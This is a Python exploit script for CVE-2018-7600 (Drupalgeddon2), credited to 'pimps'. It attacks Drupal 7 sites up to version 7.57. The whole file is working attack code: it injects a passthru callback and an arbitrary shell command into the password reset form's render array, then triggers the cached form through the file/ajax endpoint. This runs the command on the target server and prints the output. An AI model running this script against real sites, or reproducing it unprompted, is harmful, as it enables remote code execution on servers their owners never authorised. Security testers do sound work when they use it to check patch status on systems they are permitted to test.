#!/usr/bin/env python3

import argparse
import re
import warnings

warnings.filterwarnings("ignore", message=r"urllib3 .* doesn't match a supported version!")

import requests


def get_args():
    parser = argparse.ArgumentParser(
        prog="drupa7-CVE-2018-7600.py",
        formatter_class=lambda prog: argparse.HelpFormatter(prog, max_help_position=50),
        epilog=(
            "This script exploits CVE-2018-7600 against Drupal 7 <= 7.57 by poisoning "
            "the password reset form and triggering it via ajax."
        ),
    )
    parser.add_argument("target", help="URL of target Drupal site (ex: http://target.com/)")
    parser.add_argument(
        "command_positional",
        nargs="?",
        help="Legacy positional command argument; same as --command.",
    )
    parser.add_argument("-c", "--command", default="id", help="Command to execute (default = id)")
    parser.add_argument("-f", "--function", default="passthru", help="Function to use as attack vector (default = passthru)")
    parser.add_argument("-p", "--proxy", default="", help="Configure a proxy in the format http://127.0.0.1:8080/ (default = none)")
    args = parser.parse_args()
    if args.command_positional and args.command == "id":
        args.command = args.command_positional
    return args


def extract_form_build_id(html):
    patterns = [
        r"name=[\"']form_build_id[\"'][^>]*value=[\"']([^\"']+)",
        r"value=[\"']([^\"']+)[\"'][^>]*name=[\"']form_build_id[\"']",
    ]
    for pattern in patterns:
        match = re.search(pattern, html, flags=re.I)
        if match:
            return match.group(1)
    return None


def pwn_target(target, function, command, proxy):
    requests.packages.urllib3.disable_warnings()
    proxies = {"http": proxy, "https": proxy} if proxy else None
    print("[*] Poisoning a form and including it in cache.")
    get_params = {
        "q": "user/password",
        "name[#post_render][]": function,
        "name[#type]": "markup",
        "name[#markup]": command,
    }
    post_params = {
        "form_id": "user_pass",
        "_triggering_element_name": "name",
        "_triggering_element_value": "",
        "opz": "E-mail new Password",
    }
    response = requests.post(target, params=get_params, data=post_params, verify=False, proxies=proxies, timeout=15)
    form_build_id = extract_form_build_id(response.text)
    if not form_build_id:
        raise RuntimeError("Unable to locate form_build_id in Drupal password reset response.")

    print("[*] Poisoned form ID: " + form_build_id)
    print("[*] Triggering exploit to execute: " + command)
    trigger_get = {"q": "file/ajax/name/#value/" + form_build_id}
    trigger_post = {"form_build_id": form_build_id}
    trigger = requests.post(target, params=trigger_get, data=trigger_post, verify=False, proxies=proxies, timeout=15)
    parsed_result = trigger.text.split('[{"command":"settings"')[0]
    print(parsed_result)


def main():
    print()
    print("=============================================================================")
    print("|          DRUPAL 7 <= 7.57 REMOTE CODE EXECUTION (CVE-2018-7600)           |")
    print("|                              by pimps                                     |")
    print("=============================================================================\n")

    args = get_args()
    pwn_target(args.target.strip(), args.function.strip(), args.command.strip(), args.proxy.strip())


if __name__ == "__main__":
    main()
